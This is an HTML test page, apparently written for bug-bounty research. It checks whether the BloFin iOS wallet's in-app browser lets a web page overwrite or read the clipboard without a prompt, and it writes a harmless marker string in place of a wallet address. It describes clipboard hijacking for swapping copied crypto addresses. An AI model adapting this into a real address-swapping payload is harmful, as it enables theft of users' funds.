<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>BloFin v5 Clipboard - 0x403for</title>
<style>body{background:#000;color:#ddd;font-family:monospace;padding:12px;font-size:12px}h3{color:#f5c518}button{width:100%;padding:14px;margin:6px 0;background:#f5c518;color:#000;font-weight:bold;border:none;border-radius:10px}pre{background:#111;border:1px solid #333;padding:10px;border-radius:8px;white-space:pre-wrap;word-break:break-all;color:#0ff;min-height:120px}input{width:100%;padding:10px;background:#222;color:#fff;border:1px solid #444;border-radius:6px;margin:6px 0}</style>
</head>
<body>
<h3>BloFin iOS v5 - Clipboard Hijack Test</h3>
<input id="custom" value="0x403for_clipboard_test_blofin_1.8.5">
<button onclick="testWrite()">1. Test clipboard.writeText</button>
<button onclick="testRead()">2. Test clipboard.readText</button>
<button onclick="testPaste()">3. Test paste hijack simulation</button>
<pre id="log">Ready - BloFin iOS 1.8.5 - klik tombol harus pakai gesture user</pre>
<script>
const l = document.getElementById('log');
const out = (m)=>{ l.innerText += "\n"+m; console.log(m); };

async function testWrite(){
 const txt = document.getElementById('custom').value;
 out("\n=== TEST 1 writeText ===");
 out("> Trying to write: "+txt);
 try{
  await navigator.clipboard.writeText(txt);
  out("writeText SUCCESS - BloFin allows DApp to overwrite clipboard!");
  out("=> Jika SUCCESS tanpa popup = bug Medium. DApp bisa ganti alamat wallet pas user copy.");
 }catch(e){
  out("writeText BLOCKED (SECURE): "+e.message);
  out("=> Secure, BloFin block clipboard hijack");
 }
}

async function testRead(){
 out("\n=== TEST 2 readText ===");
 out("> Trying to read clipboard...");
 try{
  const t = await navigator.clipboard.readText();
  out("readText SUCCESS: "+t.slice(0,100));
  out("=> Jika SUCCESS tanpa permission = privacy leak! DApp bisa baca copy-an user.");
 }catch(e){
  out("readText BLOCKED (SECURE): "+e.message);
  out("=> Secure, butuh permission");
 }
}

async function testPaste(){
 out("\n=== TEST 3 Paste Hijack Simulation ===");
 out("1. Copy alamat asli di app lain dulu");
 out("2. Klik tombol TEST 1 tadi, itu akan overwrite clipboard kamu");
 out("3. Coba paste di notes - apakah alamat berubah jadi 0x403for_...?");
 out("Jika berubah = BloFin rentan clipboard hijack");
}
</script>
</body>
</html>
